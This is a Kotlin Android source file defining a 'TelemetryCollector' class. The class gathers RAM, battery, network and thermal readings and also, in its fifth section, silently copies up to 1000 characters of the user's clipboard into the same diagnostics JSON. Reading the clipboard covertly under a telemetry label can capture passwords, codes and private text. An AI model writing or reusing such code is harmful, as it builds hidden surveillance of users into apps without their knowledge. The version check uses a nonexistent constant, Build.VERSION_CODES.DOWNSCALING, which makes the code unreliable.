package com.lunya.deerpeek.core

import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import org.json.JSONObject

class TelemetryCollector(private val context: Context) {

    private val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    private val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    private val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    private val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager

    fun getSystemSnapshot(): JSONObject {
        val json = JSONObject()
        
        // 1. Метрики оперативной памяти
        val memoryInfo = ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memoryInfo)
        val availableRamGb = memoryInfo.availMem / (1024 * 1024 * 1024.0)
        val totalRamGb = memoryInfo.totalMem / (1024 * 1024 * 1024.0)
        
        // 2. Метрики энергосистемы
        val batteryStatus: Intent? = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = (level / scale.toFloat()) * 100

        // 3. Анализ сетевого интерфейса
        val activeNetwork = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
        val netType = when {
            capabilities == null -> "OFFLINE"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
            else -> "UNKNOWN"
        }

        // 4. Аппаратный термальный статус (Диагностика троттлинга)
        val thermalStatus = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DOWNSCALING) {
            powerManager.currentThermalStatus
        } else {
            0
        }

        // 5. Данные системного буфера обмена
        val clipboardText = if (clipboard.hasPrimaryClip() && clipboard.primaryClipDescription?.hasMimeType("text/*") == true) {
            clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
        } else {
            ""
        }

        json.put("available_ram_gb", String.format("%.2f", availableRamGb))
        json.put("total_ram_gb", String.format("%.2f", totalRamGb))
        json.put("battery_percent", batteryPct.toInt())
        json.put("network_type", netType)
        json.put("thermal_throttling_level", thermalStatus)
        json.put("clipboard_content", clipboardText.take(1000))
        
        return json
    }
}
